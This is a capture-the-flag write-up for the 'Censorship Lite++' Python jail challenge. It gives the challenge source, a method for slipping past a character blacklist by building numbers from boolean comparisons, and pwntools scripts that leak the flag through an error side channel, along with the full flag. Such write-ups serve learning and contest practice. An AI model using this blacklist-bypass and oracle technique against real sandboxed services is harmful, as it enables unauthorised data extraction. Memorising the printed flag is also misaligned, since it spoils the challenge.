# Censorship Lite++

By: SuperBeetleGamer

I played for BCS&C and we finished 8th in the US HS div.

## Solve

We know it's a pyjail so off the bat it's gonna be a little hard for me. However, I would like to note that my solution is definitely not the most elegant solution out there. It works for my purpose.

But let's pop open the source anyway.

```py
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```

As we can tell, the blacklist characters are `lite0123456789 :< :( ): :{ }: :*\ ,-.`. We can't even spell "flag" since "l" is blacklisted! Thankfully, we can get around that by using `_` since `for _ in [flag]` is equal to the flag. Since numbers were blacklisted, I created my own.

In python, a boolean can be interpreted as an integer. True = 1 and False = 0. We can create any number by adding True + True.

```py
>>> True + True == 2
True
```

Since `e` is blacklisted, we can just use an operation like `"a" == "a"`. By stringing together multiples of these, we get any number. For example,

Note, I used triple quotes to pass the `\` blacklist. Apparently single quotes work fine too.

```py
>>> ["""a"""=="""a"""]["""a"""!="""a"""]+["""a"""=="""a"""]["""a"""!="""a"""] == 2
True
```

With numbers, we can iterate through each index of the flag. For example, the 2nd char of the flag "m" can be obtained as:

```
_[["""a"""=="""a"""]["""a"""!="""a"""]]
```

Then, we can compare that to a random char. If it's equal, we raise an error signaling that we found the flag char. If not, it continues.

To raise an error, I chose the simplest method I could think of. Indexes. You can take an index of a string but not an int. For example:

```py
>>> ["hello", 2][0][0]
"h"
>>> ["hello", 2][1][0]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'int' object is not subscriptable
```

Thus, we can construct it as something along the lines of:

```
["string", number][True or False depending on our flag guess][0]
```

If our flag guess is True, then it'll throw an error, if its False, it will continue.

Solve code (given the flag length was 98):

```py
known = "amateursCTF{"
for _ in range(97-len(known)):

	r = remote("amt.rs", 31672)

	alph = "abcdfghjkmnopqrsuvwxyzlite_}"

	got = False
	for i in alph:
		resp = r.recvuntil(b"Give code: ")
		if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
			known += alph[alph.index(i)-1]
			got = True
			break

		payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for idx in range(len(known))]) + ']=="""' + i + '"""]["""a"""!="""a"""]]["""a"""!="""a"""]'

		r.sendline(payload.encode())
	if not got:
		known += "?"
	r.close()

known += "}"
print(known)
```

Unfortunately, I soon realized that the orgs were trolling. They made the flag full of blacklisted characters. This script gave me something like:

```
amateursCTF{??_?????_??????_????s_???_??_??gh?_??gh?_??_f?ag_???_the_??gh?_????d_??_?????s?_??v??}
```

Luckily, instead of checking if our letter is equal to the flags letter, we can use the flag prefix to our advantage:

Instead of:

```
_[15] == "e"
```

We can do:

```
_[15] == _[4]
```

Nice! So we can recover the index of the blacklisted chars, `e` and `t`. We can also recover `l` with a reasonable assumption that `f?ag` is just `flag`. Then, by process of elimination, we can recover `i`.


Sample code to recover `t`:

```py
other = []
for i in range(98):
	r = remote("amt.rs", 31672)
	payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(i)]) + ']==_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(3)]) + ']]["""a"""!="""a"""]]["""a"""!="""a"""]'
	resp = r.recvuntil(b"Give code: ")
	r.sendline(payload.encode())
	resp = r.recvuntil(b"Give code: ")
	if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
		other.append(i)
	r.close()
print(other)
```

Adjusting this code in a few parts gave me the following flags:

```
amateursCTF{??_?????_??????_????s_???_??_??gh?_??gh?_??_f?ag_???_the_??gh?_????d_??_?????s?_??v??}
amateursCTF{l?_?l???_l???l?_??l?s_l??_l?_l?gh?_l?gh?_l?_flag_??l_the_l?gh?_??l?d_l?_?l???s?_l?v?l}
amateursCTF{le_el??e_l???le_??les_le?_le_l?gh?_l?gh?_le_flag_??l_the_l?gh?_??led_le_el???s?_level}
amateursCTF{le_el?te_l?ttle_t?les_let_le_l?ght_l?ght_le_flag_t?l_the_l?ght_t?led_le_el?t?st_level}

Full flag:
amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}
```

## Flag

`amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}`

## Full Solve Script

```py
from pwn import *

known = "amateursCTF{"
for _ in range(97-len(known)):

	r = remote("amt.rs", 31672)

	alph = "abcdfghjkmnopqrsuvwxyzlite_}"

	got = False
	for i in alph:
		resp = r.recvuntil(b"Give code: ")
		if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
			known += alph[alph.index(i)-1]
			got = True
			break

		payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for idx in range(len(known))]) + ']=="""' + i + '"""]["""a"""!="""a"""]]["""a"""!="""a"""]'

		r.sendline(payload.encode())
	if not got:
		known += "?"
	r.close()

known += "}"
print(known)

# amateursCTF{??_?????_??????_????s_???_??_??gh?_??gh?_??_f?ag_???_the_??gh?_????d_??_?????s?_??v??}

idxes = [12, 13, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 34, 35, 36, 38, 39, 41, 42, 45, 47, 48, 51, 53, 54, 57, 61, 62, 63, 69, 70, 73, 75, 76, 77, 78, 81, 82, 84, 85, 86, 87, 88, 90, 92, 93, 95, 96]
other = []
for i in idxes:
	r = remote("amt.rs", 31672)
	payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(i)]) + ']==_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(57)]) + ']]["""a"""!="""a"""]]["""a"""!="""a"""]'
	resp = r.recvuntil(b"Give code: ")
	r.sendline(payload.encode())
	resp = r.recvuntil(b"Give code: ")
	if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
		other.append(i)
	r.close()
print(other)

# amateursCTF{l?_?l???_l???l?_??l?s_l??_l?_l?gh?_l?gh?_l?_flag_??l_the_l?gh?_??l?d_l?_?l???s?_l?v?l}

idxes = [12, 13, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 34, 35, 36, 38, 39, 41, 42, 45, 47, 48, 51, 53, 54, 57, 61, 62, 63, 69, 70, 73, 75, 76, 77, 78, 81, 82, 84, 85, 86, 87, 88, 90, 92, 93, 95, 96]
other = []
for i in idxes:
	r = remote("amt.rs", 31672)
	payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(i)]) + ']==_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(4)]) + ']]["""a"""!="""a"""]]["""a"""!="""a"""]'
	resp = r.recvuntil(b"Give code: ")
	r.sendline(payload.encode())
	resp = r.recvuntil(b"Give code: ")
	if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
		other.append(i)
	r.close()
print(other)

# amateursCTF{le_el??e_l???le_??les_le?_le_l?gh?_l?gh?_le_flag_??l_the_l?gh?_??led_le_el???s?_level}

idxes = [12, 13, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 34, 35, 36, 38, 39, 41, 42, 45, 47, 48, 51, 53, 54, 57, 61, 62, 63, 69, 70, 73, 75, 76, 77, 78, 81, 82, 84, 85, 86, 87, 88, 90, 92, 93, 95, 96]
other = []
for i in idxes:
	r = remote("amt.rs", 31672)
	payload = '[["""varun"""]+["""a"""=="""a"""]]["""a"""!="""a"""][[_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(i)]) + ']==_[' + '+'.join(['["""a"""=="""a"""]["""a"""!="""a"""]' for _ in range(3)]) + ']]["""a"""!="""a"""]]["""a"""!="""a"""]'
	resp = r.recvuntil(b"Give code: ")
	r.sendline(payload.encode())
	resp = r.recvuntil(b"Give code: ")
	if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" in resp:
		other.append(i)
	r.close()
print(other)

# amateursCTF{le_el?te_l?ttle_t?les_let_le_l?ght_l?ght_le_flag_t?l_the_l?ght_t?led_le_el?t?st_level
```
